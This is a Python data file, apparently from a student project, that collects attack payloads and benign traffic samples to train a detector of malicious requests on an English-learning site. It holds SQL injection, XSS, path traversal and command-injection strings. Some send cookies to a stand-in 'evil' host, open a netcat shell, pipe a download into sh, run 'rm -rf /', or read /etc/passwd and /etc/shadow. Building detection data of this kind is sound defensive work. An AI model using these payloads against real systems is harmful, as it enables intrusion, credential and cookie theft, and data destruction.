"""
Kho payload tấn công và mẫu lưu lượng bình thường để sinh dữ liệu huấn luyện.

Mục tiêu học thuật của đồ án: mô hình học từ dữ liệu này để phân biệt request
độc hại với request bình thường của EngPro. Đặc biệt chú ý các câu tiếng Anh
tự do (bài Writing, hỏi đáp) – đây là nguồn gây BÁO NHẦM nếu chỉ dùng regex.
"""

# ── Payload tấn công theo họ ────────────────────────────────────────
SQLI = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 'a'='a",
    "1' UNION SELECT username, password FROM users--",
    "1 UNION ALL SELECT NULL, version()--",
    "'; DROP TABLE users;--", "' OR SLEEP(5)--", "1' AND pg_sleep(5)--",
    "' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--",
    "1) OR (1=1", "') OR ('x'='x", "' OR ''='", "0x50 OR 1=1",
    "'; WAITFOR DELAY '0:0:5'--", "1 AND 1=CONVERT(int,@@version)",
    "UnIoN/**/SeLeCt/**/1,2,3", "'||(SELECT password FROM users LIMIT 1)||'",
    "1'; INSERT INTO users VALUES('h','h')--", "%27%20OR%201%3D1--",
    "email=a@a.com' OR '1'='1&password=x", "id=1 OR 1=1",
    "sort=name;SELECT * FROM sqlite_master", "' AND extractvalue(1,concat(0x7e,version()))--",
]

XSS = [
    "<script>alert(1)</script>", "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
    "javascript:alert(document.cookie)", "<iframe src=javascript:alert(1)>",
    "<body onload=alert('xss')>", "\"><script>alert(1)</script>",
    "<img src=x onerror=fetch('http://evil/c?'+document.cookie)>",
    "<a href=javascript:document.location='http://evil'>x</a>",
    "%3Cscript%3Ealert(1)%3C/script%3E", "<ScRiPt>alert(1)</ScRiPt>",
    "<div onmouseover=alert(1)>hover</div>", "<input onfocus=alert(1) autofocus>",
    "<svg><script>alert(1)</script></svg>", "'><img src=1 onerror=alert(1)>",
    "comment=<script>steal()</script>", "name=<svg onload=alert(1)>",
    "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
]

TRAVERSAL = [
    "../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "../../.env", "../../../../../../etc/shadow",
    "....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
    "/var/www/../../etc/passwd", "file:///etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../app/.env",
    "../uploads/../../server.js", "..%5c..%5cboot.ini",
    "/api/gv/materials/../../../.env", "?file=../../../../etc/passwd",
]

CMDI = [
    "; cat /etc/passwd", "| whoami", "&& ls -la", "`id`", "$(cat /etc/passwd)",
    "; curl http://evil/x | sh", "|| ping -c 10 evil.com", "; rm -rf /",
    "& powershell -enc AAAA", "$(wget http://evil/shell)", "; uname -a",
    "name=test;nc -e /bin/sh evil 4444", "| cat /etc/shadow",
]

SCANNER_UA = [
    "sqlmap/1.7.2#stable (http://sqlmap.org)", "Nikto/2.5.0",
    "Mozilla/5.00 (Nikto/2.1.6)", "nmap-nse", "acunetix-wvs",
    "dirbuster", "gobuster/3.5", "Nessus", "masscan/1.3", "WPScan",
]

MISC = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{config.items()}}",
    "%00", "/.git/config", "/.env", "/wp-config.php",
]


# ── Lưu lượng BÌNH THƯỜNG của EngPro ───────────────────────────────
# Đường dẫn API thật (lấy từ server.js)
BENIGN_PATHS = [
    "/", "/index.html", "/pages/courses.html", "/pages/login.html",
    "/api/public/home", "/api/courses", "/api/courses/12", "/api/courses/3/reviews",
    "/api/auth/me", "/api/auth/login", "/api/auth/register", "/api/notifications",
    "/api/user/learning", "/api/user/results", "/api/user/profile",
    "/api/user/courses", "/api/user/courses/8/completion", "/api/placement/ielts",
    "/api/writing/prompts", "/api/ai/status", "/api/lectures/45/questions",
    "/api/gv/courses/2/outline", "/api/admin/stats", "/api/admin/revenue",
    "/js/i18n.js", "/js/auth-nav.js", "/uploads/materials/lecture1.docx",
    "/api/user/results/mock/17", "/api/sections/9/audio", "/api/payments/config",
]

# Query bình thường
BENIGN_QUERIES = [
    "", "page=1", "page=2&limit=20", "exam=ielts", "kind=mock&id=17",
    "search=ielts", "search=business english", "category=TOEIC",
    "sort=newest", "level=intermediate", "band=6.5", "q=grammar",
    "ref=EP1732000000123", "vnp_ResponseCode=00&vnp_TxnRef=EP123",
]

# Câu tiếng Anh tự do như học viên nộp bài Writing / hỏi đáp – DỄ BỊ BÁO NHẦM.
# Cố ý chứa các từ như select, table, order, union, script, comment...
BENIGN_WRITING = [
    "In my opinion, students should select the courses that match their goals.",
    "Please order the paragraphs and update the table of contents.",
    "The union of the two clubs was announced at the meeting last Sunday.",
    "I want to drop this habit and focus on my studies from now on.",
    "Where can I find the reading passage for lecture 3?",
    "Could you explain why my answer to question 5 is wrong?",
    "The script of the movie was based on a true story about a family.",
    "I will delete my old notes and rewrite them more clearly.",
    "First, insert a topic sentence, then add supporting details.",
    "She works as a waiter and studies English in the evening.",
    "The company selected the best candidates from a large pool.",
    "Our teacher asked us to comment on each other's essays politely.",
    "This graph shows the number of students who passed the exam.",
    "I disagree with the statement that technology makes us lazy.",
    "The data in the table above illustrates a clear upward trend.",
    "Let me order a coffee and then continue with the grammar exercise.",
    "My brother and I love watching football on Saturday afternoons.",
    "The passage describes how bees communicate using dance movements.",
    "To conclude, both sides of the argument have valid points to make.",
    "How do I change my password and enable two-factor authentication?",
    "I scored 6.5 in the last mock test and want to reach band 7.",
    "The union representative spoke about workers' rights and fair pay.",
    "Please review my essay and point out any grammar or spelling errors.",
    "We selected option B because it best matches the reading passage.",
    "Thank you for the lecture; the explanation was very clear and useful.",
]

# Dữ liệu form/JSON bình thường
BENIGN_BODIES = [
    '{"email":"student@gmail.com","password":"MyPass123"}',
    '{"name":"Nguyen Van A","email":"a@gmail.com"}',
    '{"answers":[0,2,1,3,0],"plays":2}',
    '{"content":"I think reading every day improves vocabulary a lot."}',
    '{"rating":5,"comment":"Great course, very helpful teacher!"}',
    '{"question":"When is the deadline for lecture 4?"}',
    '{"courseId":12}', '{"txnRef":"EP1732000000123","amount":1200000}',
    'email=student%40gmail.com&password=Secret123',
    '{"prompt":"Some people prefer to study alone. Discuss both views."}',
]


# ── User-Agent và header BÌNH THƯỜNG ───────────────────────────────
# Rất quan trọng: nếu chỉ mẫu tấn công mới có User-Agent, mô hình sẽ học nhầm
# thành "có User-Agent = xấu" và chặn luôn người dùng thật.
BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
    "curl/8.7.1",
    "PostmanRuntime/7.39.0",
    "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)",
]

BENIGN_REFERERS = [
    "http://localhost:8000/", "http://localhost:8000/pages/courses.html",
    "http://localhost:8000/pages/my-learning.html", "http://127.0.0.1:8000/",
    "http://localhost:8000/pages/course-learn.html?id=12",
]

# Cookie phiên đăng nhập thật của EngPro (express-session)
BENIGN_COOKIES = [
    "connect.sid=s%3AxK9mPq2vLn8wRt4.hJ3kLm9pQr2sTv5wXy8zAb1cDe4fGh7i",
    "connect.sid=s%3A7bNcVm4xZq1yUi3.pLo9kJh6gFd3sAq8wEr5tYu2iOp7aSd4; lang=en",
    "lang=vi",
    "connect.sid=s%3AmQ2wEr5tYu8iOp1.zXc4vBn7mAs9dFg2hJk5lPo8iUy3tRe6",
]
